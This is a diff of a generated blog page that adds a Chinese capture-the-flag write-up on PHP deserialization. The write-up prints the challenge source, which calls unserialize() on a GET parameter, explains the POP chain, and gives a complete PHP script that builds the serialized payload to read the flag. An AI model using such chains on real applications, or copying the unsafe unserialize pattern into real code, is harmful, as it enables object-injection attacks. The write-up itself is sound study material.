@@ -193,7 +193,7 @@
   const ipt = document.querySelector('#search-input')
   const btn = document.querySelector('#search-btn')
   const layer = document.querySelector('#search-layer')
-  const posts = JSON.parse(`[{"title":"babyserialize","path":"2025/07/07/babyserialize/"},{"title":"pop","path":"2025/07/07/pop/"},{"title":"level-up","path":"2025/07/07/level-up/"}]`)
+  const posts = JSON.parse(`[{"title":"babyserialize","path":"2025/07/07/babyserialize/"},{"title":"level-up","path":"2025/07/07/level-up/"},{"title":"pop","path":"2025/07/07/pop/"}]`)
   ipt.addEventListener('keyup', e => {
     if (e.key === 'Enter') {
       handleSearch()
@@ -258,13 +258,13 @@
       <div class="main-left--statics">
         <a href="/categories">
           <div>
-            <span>0</span>
+            <span>2</span>
             <span>分类</span>
           </div>
         </a>
         <a href="/tags">
           <div>
-            <span>1</span>
+            <span>3</span>
             <span>标签</span>
           </div>
         </a>
@@ -358,13 +358,13 @@
           
           <div class="article-info--categories">
             <span>分类：</span>
-            
+            <a class="category-link" href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop/">反序列化Pop</a>
           </div>
           
           
           <div class="article-info--tags">
             <span>标签：</span>
-            
+            <a class="tag-link" href="/tags/pop/" rel="tag">pop</a>
           </div>
           
           <p class="article-info--date">日期：2025-07-07 19:59:59</p>
@@ -373,7 +373,52 @@
       </div>
     </div>
     <article class="article-content markdown-body">
-      
+      <h2 id="审计代码"><a href="#审计代码" class="headerlink" title="审计代码"></a>审计代码</h2><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>审计代码</p>
+<p>在这段代码中看到两个魔法函数我们需要利用这两个魔法函数去构造一下pop链</p>
+<p>先明确一下pop链</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w22m::<span class="title function_ invoke__">__destruct</span>()-&gt;w33m::<span class="title function_ invoke__">__toString</span>()-&gt;w44m::<span class="title function_ invoke__">Getflag</span>()</span><br></pre></td></tr></table></figure>
+
+<p>然后明确一下我们构造paylaod的思路</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>1.需要反序列化一个w22m类的对象（因为这个类的对象在代码结束时会自动调用)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> w22m;</span><br></pre></td></tr></table></figure>
+
+<p>2.因为w22m类只有一个属性w00m，而且在反序列化时我们只能利用对象的属性，所以这个属性我们需要充分利用一下</p>
+<p>因为__toString这个魔法函数只有在包含这个魔法函数对应的类的对象被当作字符串使用时才会调用所有我们需要利用w22m类中的w00m这个属性再创建一个针对w33m类的对象（方便我们下面对这个类的属性进行有用的篡改）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;w00m=<span class="keyword">new</span> w33m;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><pre><code class="language-php">$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();
+-&gt;&#123;...&#125;()：动态调用对象的方法
+也就是w00m对象调用w22m方法
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在我们的代码中我们除了一个两个魔法函数还看到一个至关重要的能够输出flag的函数</span><br><span class="line"></span><br><span class="line">那么我们在已经触发__toString函数的前提下篡改一下w33m类下的两个属性</span><br><span class="line"></span><br><span class="line">（1）将w00m属性篡改成包含Getflag()函数的类的对象（也就是w44m）的对象</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">$a-&gt;w00m-&gt;w00m=new w44m;</span><br></pre></td></tr></table></figure>
+
+（2）将w22m属性篡改成我们需要利用的函数也就是（Getflag函数）
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w22m=<span class="string">&quot;Getflag&quot;</span>;</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ol>
+<p>4.最后输出序列化的对象a</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+
+<p>因为变量前是protected，则会在变量名前加上<code>\x00*\x00</code>,</p>
+<p>若是private，则会在变量名前加上<code>\x00类名\x00</code>,输出时一般需要url编码</p>
+<p>生成payload的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> w22m;</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m=<span class="keyword">new</span> w33m;</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w00m=<span class="keyword">new</span> w44m;</span><br><span class="line"><span class="variable">$a</span>-&gt;w00m-&gt;w22m=<span class="string">&quot;Getflag&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li></li>
+</ol>
+<p>最后get传参w00m的内容为$a序列化后的内容</p>
+<p>传参传到源代码中之后经过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br></pre></td></tr></table></figure>
+
+<p>反序列化</p>
+<p>得到flag</p>
+
     </article>
     
     <div class="read-nums">
@@ -394,7 +439,7 @@
     <div class="article-catelogue--wrapper">
       <div class="catelogue catelogue-1">
         <h3>目录</h3>
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E4%BB%A3%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">审计代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">解题思路</span></a></li></ol>
       </div>
       
         <div class="catelogue catelogue-2">
